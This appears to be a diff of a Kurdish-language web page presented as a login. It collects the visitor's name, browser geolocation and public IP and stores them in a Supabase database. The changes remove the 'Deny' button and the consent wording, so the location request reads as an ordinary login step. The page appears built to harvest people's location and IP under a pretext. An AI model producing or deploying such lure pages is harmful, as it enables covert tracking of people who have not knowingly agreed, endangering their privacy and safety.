@@ -22,6 +22,16 @@
       box-shadow: 0 5px 20px rgba(0,0,0,.1);
     }
 
+    input {
+      width: 90%;
+      padding: 12px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 16px;
+      text-align: center;
+    }
+
     button {
       width: 100%;
       padding: 14px;
@@ -30,16 +40,8 @@
       border-radius: 10px;
       font-size: 16px;
       cursor: pointer;
-    }
-
-    #allow {
       background: #007aff;
       color: white;
-    }
-
-    #deny {
-      background: #ddd;
-      color: #222;
     }
 
     #result {
@@ -54,10 +56,11 @@
 
   <div class="box">
     <h2>داخڵبوون</h2>
-    <p>بۆ بەردەوامبوون، تکایە رەزامەندیت هاوبەش بکە.</p>
+    <p>تکایە ناوت بنووسە بۆ بەردەوامبوون:</p>
+
+    <input type="text" id="username" placeholder="ناوی تەواو..." />
 
     <button id="allow">بەردەوام بوون</button>
-    <button id="deny">ڕەتکردنەوە</button>
 
     <div id="result">ئامادەیە...</div>
   </div>
@@ -68,40 +71,37 @@
     const SUPABASE_URL = "https://mxichdljcrlcomnhkcin.supabase.co";
     const SUPABASE_KEY = "sb_publishable_SlntFaOIzECUYXOwVUzmDQ_cLzgxh-P";
 
-    // دروستکردنی Supabase Client بە شێوەیەکی ئامادەکراو
     let supabase = null;
     try {
       if (window.supabase && typeof window.supabase.createClient === 'function') {
         supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
       }
     } catch (e) {
-      console.error("Supabase Init Error:", e);
+      console.error(e);
     }
 
     const allowButton = document.getElementById("allow");
-    const denyButton = document.getElementById("deny");
     const result = document.getElementById("result");
+    const usernameInput = document.getElementById("username");
 
     allowButton.addEventListener("click", function () {
-      result.innerText = "① دوگمەکە کار کرد...";
-
-      const name = prompt("ناوی خۆت تۆماربکە:");
+      const name = usernameInput.value;
 
       if (!name || !name.trim()) {
-        result.innerText = "❌ ناوت نەنووسیوە.";
+        result.innerHTML = "<b style='color:red;'>❌ تکایە پێشتر ناوەکەت بنووسە.</b>";
         return;
       }
 
-      result.innerText = "② ناو وەرگیرا. تکایە لە بڕاوسەرەکەت ڕێگەپێدان (Allow) هەڵبژێرە...";
+      result.innerText = "⏳ تکایە ڕێگەپێدان (Allow) قبوڵ بکە...";
 
       if (!navigator.geolocation) {
-        result.innerText = "❌ Browser ـەکەت Geolocation پشتگیری ناکات.";
+        result.innerText = "❌ Geolocation پشتگیری ناکرێت.";
         return;
       }
 
       navigator.geolocation.getCurrentPosition(
         async function(position) {
-          result.innerText = "③ Location وەرگیرا. ئێستا IP دەهێنین...";
+          result.innerText = "🔄 Location وەرگیرا، ڕەوانەی Supabase دەکرێت...";
 
           const latitude = position.coords.latitude;
           const longitude = position.coords.longitude;
@@ -112,10 +112,8 @@
             const ipData = await response.json();
             publicIP = ipData.ip;
           } catch (error) {
-            console.error("IP Fetch Error:", error);
+            console.error(error);
           }
-
-          result.innerText = "④ زانیارییەکان ڕەوانەی Supabase دەکرێن...";
 
           if (supabase) {
             const { error } = await supabase
@@ -130,36 +128,21 @@
               ]);
 
             if (error) {
-              console.error(error);
-              result.innerText = "❌ Supabase Error: " + error.message;
+              result.innerText = "❌ هەڵەی Supabase: " + error.message;
               return;
             }
           }
 
-          result.innerHTML = "<h3>✅ تەواو بوو!</h3><p>Location بە سەرکەوتوویی هەڵگیرا.</p>";
+          result.innerHTML = "<h3>✅ سەرکەوتوو بوو!</h3><p>زانیارییەکان تۆمارکران.</p>";
         },
         function(error) {
-          console.error("Geolocation Error:", error);
-          if (error.code === 1) {
-            result.innerHTML = "<b style='color:red;'>❌ Location Permission ڕەتکرایەوە. تکایە لە ڕێکخستنی بڕاوسەرەکە Reset بکه.</b>";
-          } else if (error.code === 2) {
-            result.innerText = "❌ Location بەردەست نییە. GPS هۆڵبکە.";
-          } else if (error.code === 3) {
-            result.innerText = "❌ داواکاری Location کاتی تەواو بوو (Timeout).";
-          } else {
-            result.innerText = "❌ هەڵەیەک لە Location ڕوویدا.";
-          }
+          result.innerHTML = "<b style='color:red;'>❌ هەڵە لە وەرگرتنی شوێن. تکایە Permissions ڕێکبخەرەوە.</b>";
         },
         {
-          enableHighAccuracy: false, // خێراتر و بێ پشت بەستن بە GPSی بەهێز
-          timeout: 20000,
-          maximumAge: 0
+          enableHighAccuracy: false,
+          timeout: 20000
         }
       );
-    });
-
-    denyButton.addEventListener("click", function() {
-      result.innerText = "Location ڕەتکرایەوە.";
     });
   </script>
 
